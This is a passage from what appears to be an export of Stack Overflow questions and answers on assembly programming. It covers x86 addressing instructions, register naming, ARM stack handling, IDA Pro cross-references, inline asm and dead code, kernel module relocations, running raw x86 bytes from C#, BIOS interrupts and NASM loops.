","<p><code>lea</code> means <strong>Load Effective Address</strong>. So <code>lea SI, str1</code> sets <code>si</code> to the offset of <code>str1</code>. The correct memory addressing syntax used by <code>lea</code> and other instructions depends on the assembler used, some assemblers want <code>lea si,[str1]</code>.</p>

<p><code>lds</code> and <code>les</code> do something completely different compared to <code>lea</code>. <code>lds</code> means <strong>Load pointer using DS</strong> and likewise <code>les</code> means <strong>Load pointer using ES</strong>. In practice, <code>lds SI, ptr_str1</code> sets <code>ds</code> and <code>si</code> based on the values stored in the memory address <code>ds:ptr_str1</code> (the syntax is <code>[ds:ptr_str1]</code> in some assemblers).</p>

<p>So, what these instructions do in your code:</p>

<ol>
<li><p><code>lea SI, str1</code> sets <code>si</code> to point to the address of <code>str1</code>. This seems perfectly OK.</p></li>
<li><p><code>lds SI, ptr_str1</code> sets <code>si</code> to <code>'My'</code> (0x794d in hexadecimal) and also sets <code>ds</code> to <code>' f'</code> (0x6620 in hexadecimal). Note that x86 is a little-endian architecture. <code>ds</code> is the default segment from where the pointer value is read using <code>lds</code> and <code>les</code>. So instead of loading the string address to <code>ds:si</code>, the first 4 bytes of the string are used as an address that is loaded into <code>ds:si</code>. I assume this is not what you wanted to do.</p></li>
<li><p><code>les DI, ptr_str2</code> sets <code>di</code> according to the value stored in 0x6620:ptr_str2 (<code>ds</code> is the default segment for most x86 instructions, and currently <code>ds</code> has the value 0x6620) and also sets <code>es</code> according to the value stored in 0x6620:ptr_str2+2. Probably this is not what you wanted to do.</p></li>
</ol>
","20435370"
"What does the R stand for in RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP?","9501","","<p>The x86 assembler language has had to change as the x86 processor architecture has changed from 8bit to 16bit to 32bit and now 64bit.</p>

<p>I know that in 32bit assembler register names (EAX, EBX, etc.), the E prefix for each of the names stands for Extended meaning the 32bit form of the register rather than the 16bit form (AX, BX, etc.).</p>

<p>What does the R prefix for these register names stand for in 64bit?</p>
","<p>I think it's just R for ""register"", since there are additional registers R8 - R15 on x86-64, and R is a common prefix on many CPU architectures where registers are numbered.</p>
","10995458"
"What is the use of .byte assembler directive in gnu assembly?","9499","","<p>While going through some C code having inline assembly I came across the .byte (with a Dot at the beginning) directive.</p>

<p>On checking the assembly reference on web I found that it is used to reserve a byte in memory.</p>

<p>But in the code there was no label before the statement. So I was wondering what is use of an unlabeled .byte directive or any other data storage directive for that matter.</p>

<p>For e.g. if i code <code>.byte 0x0a</code>, how can i use it ?</p>
","<p>There are a few possibilities...  here are a couple I can think of off the top of my head:</p>

<ol>
<li><p>You could access it relative to a label that comes <em>after</em> the <code>.byte</code> directive.  Example:</p>

<pre><code>  .byte 0x0a
label:
  mov (label - 1), %eax
</code></pre></li>
<li><p>Based on the final linked layout of the program, maybe the <code>.byte</code> directives will get executed as code.  Normally you'd have a label in this case too, though...</p></li>
<li><p>Some assemblers don't support generating x86 instruction prefixes for operand size, etc.  In code written for those assemblers, you'll often see something like:</p>

<pre><code>  .byte 0x66
  mov $12, %eax
</code></pre>

<p>To make the assembler emit the code you want to have.</p></li>
</ol>
","7290348"
"ARM assembly - stmfd/ldmfd","9496","","<p>I am doing a project for UNI and have a problem.
We are learning how to push/pop registers onto stack when calling a subroutine.
I need to write a subroutine to convert a decimal number 0-15 into a corresponding hex ASCII code, and keep the value of all registers except r0, where the result should be stored. I have a table of ASCII codes, and basically just add the number*4 to the starting address of the ASCII table, and store the value back into r0. 
i get the right result, but the subroutine loops. It keeps jumping from ""ldmfd"" command to ""sub"" endlessly. Any idea why?   </p>

<pre><code>main:
adr r0,num
adr r1,ascii
ldr r2,[r0]
bl  sub
sub:  stmfd sp!,{r1-r2,lr}
      ldr r0,[r1,r2,LSL #2]
      ldmfd sp!,{r1-r2,pc}

/* variables here */
num:    .word 15
ascii:  .word 0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x41,0x42,0x43,0x44,0x45,0x46
/* end variables */
</code></pre>
","<p>There are a couple of issues with your code.</p>

<ol>
<li>The main code never returns anywhere, which means after your code returns from the sub it will start again at ""sub:"" because thats your return point. As lr did not change, it will be stuck in a loop between stmfd/ldmfd. You need to call the exit-function of your system.</li>
<li>There is no reason to save r1, r2, lr. You're not changing them in your code, also r0-r3 and r12 are caller saved registers anyway.</li>
</ol>
","15835597"
"How can I get IDA Pro to ""see"" xrefs to a string?","9495","","<p>Currently, I'm disassembling a Mach-O executable in IDA Pro. I've gone through and found the string I'm interested in, but when I try to find xrefs to it, none can be found. I'm sure that the strings are referenced in the original code, but IDA Pro doesn't seem to be able to find out how they are referenced.</p>

<p>Are there any tricks that can be performed to get IDA Pro to see the xrefs?</p>
","<p>Have you given it enough time for it to have analyzed the entire program?  If there is a reference, it might be some time before it finds it in a large program.</p>

<p>It's also possible that it is referenced by instructions for which IDA can't find a flow path to.  This can happen with jump tables where IDA isn't able to guess the size of the table.  The reason for the <code>I</code> in IDA is that you look at the instructions which need judgment and proper interpretation and set them to the appropriate type so IDA can do most of the work.</p>
","1932328"
"g++ -no optimization- skips asm code after goto","9464","","<p>Having this piece of code:</p>

<pre><code>int main(){
        int x = 13;
        goto f;
        asm __volatile__ ("".byte 0xff"");
        f:
        return 0;
}
</code></pre>

<p>I don't understand why g++ optimize it and does not include the opcode(in the disassembly):</p>

<pre><code># 5 ""q.c"" 1
        .byte 0xff
# 0 """" 2
</code></pre>

<p>even if I do compile without any optimization at all:
<code>g++ -g -O0 -S q.c</code>. I tried with <code>g++ -g</code> and <code>g++ -O0</code> alone because I read it might not be compatible in some situations.</p>

<p>If I comment the <code>goto f;</code> line it will insert the opcode. </p>

<pre><code>        .file   ""q.c""
        .text
        .globl  main
        .type   main, @function
main:
.LFB0:
        .cfi_startproc
        pushq   %rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq    %rsp, %rbp
        .cfi_def_cfa_register 6
        movl    $13, -4(%rbp)
#APP
# 5 ""q.c"" 1&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
        .byte 0xff&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
# 0 """" 2&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
.L2:
#NO_APP
        movl    $0, %eax
        popq    %rbp
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
.LFE0:
        .size   main, .-main
        .ident  ""GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3""
        .section        .note.GNU-stack,"""",@progbits
</code></pre>

<h3>The question is: </h3>

<p>Does g++ not include a piece of code if it is not going to be used even if I compile with no optimization at all?</p>

<p>I want to know why it does not include that piece of code not finding another solutions.</p>

<h2>Update</h2>

<p>I read in the comments that : It is bad code. But what if I want to have it? What if I want to have a piece of code injected right there that does not do anything by itself? Does g++ restricts me ?</p>

<h1>Update 2</h1>

<p>Because it's dead code is not an explanation. I compiled this code on Windows VS2012</p>

<pre><code>int main() {
    std::cout &lt;&lt; ""something "";
    goto foo;
     __asm _emit 0xff
     __asm _emit 0xfe;
    foo :
    std::cout &lt;&lt; ""other thing"";
}
</code></pre>

<p>Guess what? When it is compiled with Debug configuration the asm code <strong>it is included</strong> in the binary:</p>

<pre><code>.text:00414ECE                 push    offset aSomething ; ""something ""
.text:00414ED3                 mov     eax, ds:__imp_?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; std::cout
.text:00414ED8                 push    eax
.text:00414ED9                 call    loc_41129E
.text:00414EDE                 add     esp, 8
.text:00414EE1                 jmp     short loc_414EE7
.text:00414EE1 ; ---------------------------------------------------------------------------
.text:00414EE3                 db 0EBh ; d
.text:00414EE4                 db    2
.text:00414EE5                 db 0FFh&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
.text:00414EE6                 db 0FEh ; ¦&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
.text:00414EE7 ; ---------------------------------------------------------------------------
.text:00414EE7
.text:00414EE7 loc_414EE7:                             ; CODE XREF: main+31j
.text:00414EE7                 push    offset aOtherThing ; ""other thing""
.text:00414EEC                 mov     eax, ds:__imp_?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; std::cout
.text:00414EF1                 push    eax
.text:00414EF2                 call    loc_41129E
.text:00414EF7                 add     esp, 8
.text:00414EFA                 jmp     short loc_414EFE
</code></pre>
","<p>Interestingly, all the compilers I could try (gcc, llvm-gcc, icc, clang) optimize out the code.</p>

<p>As a workaround, you can include the goto in the asm itself:</p>

<pre><code>__asm__ __volatile__ (
    ""jmp 1f\n\t""
    "".byte 0xff\n\t""
    ""1:"");
</code></pre>

<p>This is unfortunately architecture specific, while your original code might not be. For that case, the best I could think of is:</p>

<pre><code>volatile int false = 0;
if (false) __asm__ __volatile__ ("".byte 0xff"");
</code></pre>

<p>Of course this incurs a runtime load and test.
Both of these work even with optimizations enabled.</p>
","22533948"
"Newbie asm: where is the call code?","9453","","<p>I wrote this simple kernel module:</p>

<pre><code>#include &lt;linux/module.h&gt;        // for printk() 

int init( void ) 
{ 
    printk( ""n  Kello, everybody! nn"" ); 

    return    0; 
} 

void exit( void ) 
{ 
    printk( ""n  Goodbye now... nn"" ); 
} 

MODULE_LICENSE(""GPL""); 
module_init(init); 
module_exit(exit); 
</code></pre>

<p>and I'm trying to understand how the code gets translated to asm, so I objdumped it:</p>

<pre><code>root@ubuntu:/home/alex/Desktop/KModule# objdump -D kmodule.ko 

kmodule.ko:    file format elf64-x86-64 


Disassembly of section .note.gnu.build-id: 

0000000000000000 &lt;.note.gnu.build-id&gt;: 
  0:    04 00                    add    $0x0,%al 
  2:    00 00                    add    %al,(%rax) 
  4:    14 00                    adc    $0x0,%al 
  6:    00 00                    add    %al,(%rax) 
  8:    03 00                    add    (%rax),%eax 
  a:    00 00                    add    %al,(%rax) 
  c:    47                      rex.RXB 
  d:    4e 55                    rex.WRX push %rbp 
  f:    00 5e ef                add    %bl,-0x11(%rsi) 
  12:    7d 73                    jge    87 &lt;__mod_vermagic5+0x4f&gt; 
  14:    83 47 e9 4d              addl  $0x4d,-0x17(%rdi) 
  18:    98                      cwtl  
  19:    eb b8                    jmp    ffffffffffffffd3 &lt;__mod_vermagic5+0xffffffffffffff9b&gt; 
  1b:    eb 18                    jmp    35 &lt;__module_depends+0x6&gt; 
  1d:    fb                      sti    
  1e:    84 28                    test  %ch,(%rax) 
  20:    73 db                    jae    fffffffffffffffd &lt;__mod_vermagic5+0xffffffffffffffc5&gt; 
  22:    51                      push  %rcx 
  23:    e4                      .byte 0xe4 

Disassembly of section .text: 

0000000000000000 &lt;init&gt;: 
  0:    55                      push  %rbp 
  1:    48 89 e5                mov    %rsp,%rbp 
  4:    e8 00 00 00 00          callq  9 &lt;init+0x9&gt; 
  9:    48 c7 c7 00 00 00 00     mov    $0x0,%rdi 
  10:    31 c0                    xor    %eax,%eax 
  12:    e8 00 00 00 00          callq  17 &lt;init+0x17&gt; 
  17:    31 c0                    xor    %eax,%eax 
  19:    5d                      pop    %rbp 
  1a:    c3                      retq  
  1b:    0f 1f 44 00 00          nopl  0x0(%rax,%rax,1) 

0000000000000020 &lt;cleanup_module&gt;: 
  20:    55                      push  %rbp 
  21:    48 89 e5                mov    %rsp,%rbp 
  24:    e8 00 00 00 00          callq  29 &lt;cleanup_module+0x9&gt; 
  29:    48 c7 c7 00 00 00 00     mov    $0x0,%rdi 
  30:    31 c0                    xor    %eax,%eax 
  32:    e8 00 00 00 00          callq  37 &lt;cleanup_module+0x17&gt; 
  37:    5d                      pop    %rbp 
  38:    c3                      retq  
  39:    00 00                    add    %al,(%rax) 
    ... 

Disassembly of section .rodata.str1.1: 

0000000000000000 &lt;.rodata.str1.1&gt;: 
  0:    0a 20                    or    (%rax),%ah 
  2:    20 20                    and    %ah,(%rax) 
  4:    4b                      rex.WXB 
  5:    65                      gs 
  6:    6c                      insb  (%dx),%es:(%rdi) 
  7:    6c                      insb  (%dx),%es:(%rdi) 
  8:    6f                      outsl  %ds:(%rsi),(%dx) 
  9:    2c 20                    sub    $0x20,%al 
  b:    65                      gs 
  c:    76 65                    jbe    73 &lt;__mod_vermagic5+0x3b&gt; 
  e:    72 79                    jb    89 &lt;__mod_vermagic5+0x51&gt; 
  10:    62                      (bad)  
  11:    6f                      outsl  %ds:(%rsi),(%dx) 
  12:    64                      fs 
  13:    79 21                    jns    36 &lt;__module_depends+0x7&gt; 
  15:    20 0a                    and    %cl,(%rdx) 
  17:    0a 00                    or    (%rax),%al 
  19:    0a 20                    or    (%rax),%ah 
  1b:    20 20                    and    %ah,(%rax) 
  1d:    47 6f                    rex.RXB outsl %ds:(%rsi),(%dx) 
  1f:    6f                      outsl  %ds:(%rsi),(%dx) 
  20:    64                      fs 
  21:    62                      (bad)  
  22:    79 65                    jns    89 &lt;__mod_vermagic5+0x51&gt; 
  24:    20 6e 6f                and    %ch,0x6f(%rsi) 
  27:    77 2e                    ja    57 &lt;__mod_vermagic5+0x1f&gt; 
  29:    2e 2e 20 0a              cs and %cl,%cs:(%rdx) 
  2d:    0a 00                    or    (%rax),%al 

Disassembly of section .modinfo: 

0000000000000000 &lt;__mod_license27&gt;: 
  0:    6c                      insb  (%dx),%es:(%rdi) 
  1:    69 63 65 6e 73 65 3d     imul  $0x3d65736e,0x65(%rbx),%esp 
  8:    47 50                    rex.RXB push %r8 
  a:    4c 00 73 72              rex.WR add %r14b,0x72(%rbx) 

000000000000000c &lt;__mod_srcversion31&gt;: 
  c:    73 72                    jae    80 &lt;__mod_vermagic5+0x48&gt; 
  e:    63 76 65                movslq 0x65(%rsi),%esi 
  11:    72 73                    jb    86 &lt;__mod_vermagic5+0x4e&gt; 
  13:    69 6f 6e 3d 45 33 46     imul  $0x4633453d,0x6e(%rdi),%ebp 
  1a:    38 45 32                cmp    %al,0x32(%rbp) 
  1d:    30 39                    xor    %bh,(%rcx) 
  1f:    34 37                    xor    $0x37,%al 
  21:    44 32 31                xor    (%rcx),%r14b 
  24:    33 30                    xor    (%rax),%esi 
  26:    32 35 44 36 39 34        xor    0x34393644(%rip),%dh        # 34393670 &lt;__mod_vermagic5+0x34393638&gt; 
  2c:    34 45                    xor    $0x45,%al 
    ... 

000000000000002f &lt;__module_depends&gt;: 
  2f:    64                      fs 
  30:    65                      gs 
  31:    70 65                    jo    98 &lt;__mod_vermagic5+0x60&gt; 
  33:    6e                      outsb  %ds:(%rsi),(%dx) 
  34:    64                      fs 
  35:    73 3d                    jae    74 &lt;__mod_vermagic5+0x3c&gt; 
    ... 

0000000000000038 &lt;__mod_vermagic5&gt;: 
  38:    76 65                    jbe    9f &lt;__mod_vermagic5+0x67&gt; 
  3a:    72 6d                    jb    a9 &lt;__mod_vermagic5+0x71&gt; 
  3c:    61                      (bad)  
  3d:    67 69 63 3d 33 2e 30     imul  $0x2e302e33,0x3d(%ebx),%esp 
  44:    2e 
  45:    30 2d 31 36 2d 67        xor    %ch,0x672d3631(%rip)        # 672d367c &lt;__mod_vermagic5+0x672d3644&gt; 
  4b:    65 6e                    outsb  %gs:(%rsi),(%dx) 
  4d:    65                      gs 
  4e:    72 69                    jb    b9 &lt;__mod_vermagic5+0x81&gt; 
  50:    63 20                    movslq (%rax),%esp 
  52:    53                      push  %rbx 
  53:    4d 50                    rex.WRB push %r8 
  55:    20 6d 6f                and    %ch,0x6f(%rbp) 
  58:    64                      fs 
  59:    5f                      pop    %rdi 
  5a:    75 6e                    jne    ca &lt;__mod_vermagic5+0x92&gt; 
  5c:    6c                      insb  (%dx),%es:(%rdi) 
  5d:    6f                      outsl  %ds:(%rsi),(%dx) 
  5e:    61                      (bad)  
  5f:    64 20 6d 6f              and    %ch,%fs:0x6f(%rbp) 
  63:    64                      fs 
  64:    76 65                    jbe    cb &lt;__mod_vermagic5+0x93&gt; 
  66:    72 73                    jb    db &lt;__mod_vermagic5+0xa3&gt; 
  68:    69                      .byte 0x69 
  69:    6f                      outsl  %ds:(%rsi),(%dx) 
  6a:    6e                      outsb  %ds:(%rsi),(%dx) 
  6b:    73 20                    jae    8d &lt;__mod_vermagic5+0x55&gt; 
    ... 

Disassembly of section __mcount_loc: 

0000000000000000 &lt;__mcount_loc&gt;: 
    ... 

Disassembly of section __versions: 

0000000000000000 &lt;____versions&gt;: 
  0:    73 24                    jae    26 &lt;____versions+0x26&gt; 
  2:    57                      push  %rdi 
  3:    41 00 00                add    %al,(%r8) 
  6:    00 00                    add    %al,(%rax) 
  8:    6d                      insl  (%dx),%es:(%rdi) 
  9:    6f                      outsl  %ds:(%rsi),(%dx) 
  a:    64                      fs 
  b:    75 6c                    jne    79 &lt;____versions+0x79&gt; 
  d:    65                      gs 
  e:    5f                      pop    %rdi 
  f:    6c                      insb  (%dx),%es:(%rdi) 
  10:    61                      (bad)  
  11:    79 6f                    jns    82 &lt;____versions+0x82&gt; 
  13:    75 74                    jne    89 &lt;____versions+0x89&gt; 
    ... 
  3d:    00 00                    add    %al,(%rax) 
  3f:    00 49 a0                add    %cl,-0x60(%rcx) 
  42:    e1 27                    loope  6b &lt;____versions+0x6b&gt; 
  44:    00 00                    add    %al,(%rax) 
  46:    00 00                    add    %al,(%rax) 
  48:    70 72                    jo    bc &lt;____versions+0xbc&gt; 
  4a:    69 6e 74 6b 00 00 00     imul  $0x6b,0x74(%rsi),%ebp 
    ... 
  7d:    00 00                    add    %al,(%rax) 
  7f:    00 9a 0f 39 b4 00        add    %bl,0xb4390f(%rdx) 
  85:    00 00                    add    %al,(%rax) 
  87:    00 6d 63                add    %ch,0x63(%rbp) 
  8a:    6f                      outsl  %ds:(%rsi),(%dx) 
  8b:    75 6e                    jne    fb &lt;__mod_vermagic5+0xc3&gt; 
  8d:    74 00                    je    8f &lt;____versions+0x8f&gt; 
    ... 

Disassembly of section .gnu.linkonce.this_module: 

0000000000000000 &lt;__this_module&gt;: 
    ... 
  18:    6b 6d 6f 64              imul  $0x64,0x6f(%rbp),%ebp 
  1c:    75 6c                    jne    8a &lt;__this_module+0x8a&gt; 
  1e:    65 00 00                add    %al,%gs:(%rax) 
    ... 

Disassembly of section .comment: 

0000000000000000 &lt;.comment&gt;: 
  0:    00 47 43                add    %al,0x43(%rdi) 
  3:    43 3a 20                rex.XB cmp (%r8),%spl 
  6:    28 55 62                sub    %dl,0x62(%rbp) 
  9:    75 6e                    jne    79 &lt;__mod_vermagic5+0x41&gt; 
  b:    74 75                    je    82 &lt;__mod_vermagic5+0x4a&gt; 
  d:    2f                      (bad)  
  e:    4c 69 6e 61 72 6f 20     imul  $0x34206f72,0x61(%rsi),%r13 
  15:    34 
  16:    2e 36 2e 31 2d 39 75     cs ss xor %ebp,%cs:%ss:0x75627539(%rip)        # 75627558 &lt;__mod_vermagic5+0x75627520&gt; 
  1d:    62 75 
  1f:    6e                      outsb  %ds:(%rsi),(%dx) 
  20:    74 75                    je    97 &lt;__mod_vermagic5+0x5f&gt; 
  22:    33 29                    xor    (%rcx),%ebp 
  24:    20 34 2e                and    %dh,(%rsi,%rbp,1) 
  27:    36 2e 31 00              ss xor %eax,%cs:%ss:(%rax) 
  2b:    00 47 43                add    %al,0x43(%rdi) 
  2e:    43 3a 20                rex.XB cmp (%r8),%spl 
  31:    28 55 62                sub    %dl,0x62(%rbp) 
  34:    75 6e                    jne    a4 &lt;__mod_vermagic5+0x6c&gt; 
  36:    74 75                    je    ad &lt;__mod_vermagic5+0x75&gt; 
  38:    2f                      (bad)  
  39:    4c 69 6e 61 72 6f 20     imul  $0x34206f72,0x61(%rsi),%r13 
  40:    34 
  41:    2e 36 2e 31 2d 39 75     cs ss xor %ebp,%cs:%ss:0x75627539(%rip)        # 75627583 &lt;__mod_vermagic5+0x7562754b&gt; 
  48:    62 75 
  4a:    6e                      outsb  %ds:(%rsi),(%dx) 
  4b:    74 75                    je    c2 &lt;__mod_vermagic5+0x8a&gt; 
  4d:    33 29                    xor    (%rcx),%ebp 
  4f:    20 34 2e                and    %dh,(%rsi,%rbp,1) 
  52:    36 2e 31 00              ss xor %eax,%cs:%ss:(%rax)
</code></pre>

<p>but something doesn't quite stack up with the rest...</p>

<p>how are the printk function called?? I can only see ""callq 9"", and that offset doesn't tell me anything.. it's the next instruction.. so what? The message ""Kello"" gets printed correctly but I can't find the code where this happens!</p>

<p>Besides.. how can this code access the string ""Kello etc.."" in section .rodata.str1.1 ? If this is a program segment mapped into ds register, shouldn't be something like ""ds:0"" to access it?</p>

<p>I'm quite confused..</p>
","<p>Kernel modules are relocatable, and linked into the kernel when they are loaded. The actual memory addresses are only determined at that time. This is because the address for kernel functions, and the address at which the module will be loaded, are not known at compile-time.</p>

<p>If you look at the bytecode for all the <code>call</code> instructions, you will see that they all have four zero bytes. When the module is loaded, these bytes will be replaced with the actual function address. The same is true for the string address: In the instruction <code>mov    $0x0,%rdi</code>, the zero will be replaced with the correct address.</p>

<p>The reason you see instructions like <code>callq 9</code> and <code>callq 17</code> is that the <code>call</code> instruction specifies the address as relative to the next instruction. Since the relative address stored in the file is 0, the disassembler will show it as if the <code>call</code> instruction is calling the instruction following it.</p>

<p>Using <code>objdump -r</code> should show you the relocations for the module.</p>
","9758615"
"Is it possible to execute an x86 assembly sequence from within C#?","9444","","<p>Continuing my reverse engineering education I've often wanted to be able to copy portions of x86 assembly code and call it from a high level language of my choice for testing.</p>

<p>Does anyone know of a method of calling a sequence of x86 instructions from within a C# method?  I know that this can be done using C++ but I'm curious if it can be done in C#?</p>

<p>Note: I'm not talking about executing MSIL instructions.  I'm talking about executing a series of raw x86 assembly instructions.</p>
","<p>Just to counter Brian's claim, rewritten code from leppie's answer <a href=""http://androidbutnotparanoid.blogspot.com/2009/05/dynamically-generating-and-executing.html"" rel=""noreferrer"">link</a>:</p>

<pre><code>using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace DynamicX86
{
    class Program
    {
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint MEM_COMMIT = 0x1000;

        [DllImport(""kernel32.dll"", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        private delegate int IntReturner();

        static void Main(string[] args)
        {
            List&lt;byte&gt; bodyBuilder = new List&lt;byte&gt;();
            bodyBuilder.Add(0xb8);
            bodyBuilder.AddRange(BitConverter.GetBytes(42));
            bodyBuilder.Add(0xc3);
            byte[] body = bodyBuilder.ToArray();
            IntPtr buf = VirtualAlloc(IntPtr.Zero, (uint)body.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(body, 0, buf, body.Length);

            IntReturner ptr = (IntReturner)Marshal.GetDelegateForFunctionPointer(buf, typeof(IntReturner));
            Console.WriteLine(ptr());
        }
    }
}
</code></pre>
","959144"
"pop Instruction not supported in 64-bit mode using NASM?","9422","","<p>I'm working on a more indepth hello world using NASM <a href=""http://www.cin.ufpe.br/~if817/arquivos/asmtut/quickstart.html"" rel=""noreferrer"">following this tutorial</a> (section 4). This tutorial essentially teaches you how to handle command line input.
<br>This is the snippet of the code in question:</p>

<pre><code>section .text
        global _start

_start:
        pop     ebx     ; arg count
        pop     ebx     ; arg[0] the program name
        pop     ebx     ; arg[1-n] the remainder of the args
                        ; must each be indiviually popped
</code></pre>

<p>The code errors out during compilation with <code>error: instruction not supported in 64-bit mode</code> referring to the 3 pop instructions above. <a href=""http://cs.nyu.edu/courses/fall02/V22.0201-001/nasm_doc_html/nasmdocb.html#section-B.4.244"" rel=""noreferrer"">Upon viewing the docs</a> it seems that this code only works for 32-bit systems. </p>

<p>Is there a 64-bit <code>pop</code> instruction? Does anyone have a 64 bit tutorial using <code>pop</code> that I can look at?</p>
","<p>Yes, the 64-bit <code>pop</code> instruction is...  POP.  :-)  You need to use it against 64-bit registers though (like <code>rbx</code>).</p>
","10954629"
"MIPS assembly - random integer range","9415","","<p>Hello im trying to use random integer range and the values that i get is out ouf the ones that i set.</p>

<p>for example:</p>

<pre><code>sw $a0, 0($s0)  
li $a0, 1000
li $a1, 3500
li $v0, 42   #random
</code></pre>

<p>So i just want it to be random numbers between 1000-3500 but it gives me any random number.</p>

<p>Can you please help me to understand where my mistake is.</p>
","<p><code>$a0</code> is the random seed, not the lower bound.  You should set <code>$a1</code> to <code>2501</code> to generate 0-2500 random number, and add 1000 to the result.</p>

<pre><code>sw $a0, 0($s0)  
li $a1, 2501
li $v0, 42   #random
add $a0, $a0, 1000
</code></pre>
","4103805"
"Is there an assembly language for CUDA?","9395","","<p>I'm asking this because I know there's a way to use binary files instead of source files.</p>

<p>Also, I'm guessing that with an assembly language, it would be easier to simulate function pointers. Unless the assembly on a GPU is totally different from the one on a CPU.</p>
","<p>Yes, the assembly on a GPU is totally different from that of a CPU.
One of the differences is that the instruction set for a GPU is not standardized. NVidia (and AMD and other GPU vendors) can and do change their instruction set from one GPU model to the next.</p>

<p>So CUDA does not expose an assembly language. There'd be no point. (And the limitations in CUDA's C dialect, and whatever other languages they support, are there because of limitations in the GPU hardware, not just because Nvidia hates you and wants to annoy you. So even if you had direct access to the underlying instruction set and assembly language, you wouldn't be able to magically do things you can't do now.</p>

<p>(Note that there's NVidia does define a ""virtual"" instruction set that you can use and embed in your code. But it's not <em>the</em> instruction set, and it doesn't map directly to the hardware instructions. It's little more than a simpler programming language which ""looks like"" a dialect of assembly</p>
","7353189"
"Differences between: INT 10H , INT 16H, INT 21H","9384","","<p>Could anyone please explain to me the differences between: INT 10H , INT 16H, INT 21H in assembly language? When should we use any of them and for what? </p>

<p>For example: in this simple code for printing ""Hello, World!"" 
Why did we use int 10h in the fourth line?
Why did we use int 16h in the line before the last?</p>

<pre><code>name ""hi-world""
org 100h     
mov ax, 3     
int 10h      
mov ax, 1003h
mov bx, 0
int 10h
mov ax, 0b800h
mov ds, ax
mov [02h], 'H'

mov [04h], 'e'

mov [06h], 'l'

mov [08h], 'l'

mov [0ah], 'o'

mov [0ch], ','

mov [0eh], 'W'

mov [10h], 'o'

mov [12h], 'r'

mov [14h], 'l'

mov [16h], 'd'

mov [18h], '!'


mov cx, 12  ; number of characters.
mov di, 03h ; start from byte after 'h'

c:  mov [di], 11101100b 
add di, 2 ; skip over next ascii code in vga memory.
loop c

; wait for any key press:
mov ah, 0
int 16h

ret
</code></pre>
","<p>First of all <code>INT</code> means interrupt and has nothing to do with <code>int</code> data type.</p>

<p>Each <code>INT</code> represents a functions family, where usually <code>AH</code> represents the function number.</p>

<p>For example :</p>

<ol>
<li><p>INT 0x10 is used for screen manipulation</p>

<ul>
<li>AH=0x00 -> set video mode</li>
<li>AX=0x1003 -> Set Blinking mode</li>
<li>AH=0x13 -> write string</li>
<li>AH=0x03 -> get cursor position</li>
</ul></li>
<li><p>INT 0x13 is for storage (HDD and FDD)</p>

<ul>
<li>AH=0x42 -> DISK READ</li>
<li>AH=0x43 -> DISK WRITE</li>
</ul></li>
<li>INT 0x16 is for Keyboard control and read:
<ul>
<li>AH=0x00 -> GetKey</li>
<li>AH=0x03 -> Set typematic rate and delay</li>
</ul></li>
</ol>

<p>You can find all these functions here: <a href=""http://www.ctyme.com/intr/int.htm"" rel=""nofollow"">Interrupt Jump Table</a></p>

<p>But these are just BIOS INT, which can be rewritten by OS during startup. For example, Windows uses <code>INT 0x21</code> for communication between user space and kernel space; Linux-based use <code>INT 0x80</code>. See also <a href=""http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html"" rel=""nofollow"">Linux System Call Table</a></p>

<p>In your code:</p>

<ul>
<li>INT 0x10 with AH = 0x00 and AL = 3 (<code>mov ax, 3</code>) means: set video mode to TextMode 80x25 chars and 16 colors.</li>
<li>INT 0x10 with AX = 0x1003 means: TOGGLE INTENSITY/BLINKING BIT to background intensity enabled</li>
</ul>
","30188146"
"Sum 10 numbers and print result in NASM","9366","","<p>I have written following assembly code for adding 10 numbers.I am able to compile it and execute it but I am getting wrong result.
I just wanted to know how do I print the value of <strong>total</strong> on scree.</p>

<pre><code>section .data
num1: dw 10, 20, 30, 40, 50, 10, 20, 30, 40, 50
total: dw 0
msg :  db ""sum=%d"",10,0

section .text
    extern _printf
    global _main
_main:
    push ebp
    mov ebp,esp
    mov ebx,num1 ;point bx to first number
    mov ecx,10      ;load count of numbers in ecx
    mov eax,0       ;initialize sum to zero
loop:
    add eax,[ebx]
    add ebx,2
    sub ecx,1
    jnz loop
    mov [total],eax

    push total
    push msg
    call _printf

    pop ebp
    mov esp,ebp
    ret
</code></pre>

<p><strong>solution</strong></p>

<pre><code>section .data
num1: dd 10, 20, 30, 40, 50, 10, 20, 30, 40, 50,300
total: dd 0
msg :  dd ""sum=%d"",10,0

    section .text
        extern _printf
        global _main
    _main:
        push ebp
        mov ebp,esp
        mov ebx,num1 ;point bx to first number
        mov ecx,11     ;load count of numbers in ecx
        mov eax,0       ;initialize sum to zero
    loop:
        add eax,[ebx]
        add ebx,4
        sub ecx,1
        jnz loop
        mov  [total],eax
        push dword [total]

        push msg
        call _printf
        mov esp,ebp
        pop ebp

        ret
</code></pre>
","<p>I see a couple of issues here. First, you've got <code>num1</code> and <code>total</code> declared as <code>dw</code>. <code>dw</code> may sound like it means ""dword"", but it means ""data word"". You want these to be <code>dd</code> - ""data dword""... since that's how you're using them. (and <code>add ebx, 4</code> not 2) If you really need to use word (16-bit) values in 32-bit code, it can be done, but is awkward.</p>

<p>The second problem I see is that <code>push total</code> before your <code>call _printf</code> pushes the address of <code>total</code>. You want the ""[contents]"" of memory here, so <code>push dword [total]</code>. (<code>push msg</code> is correct)</p>

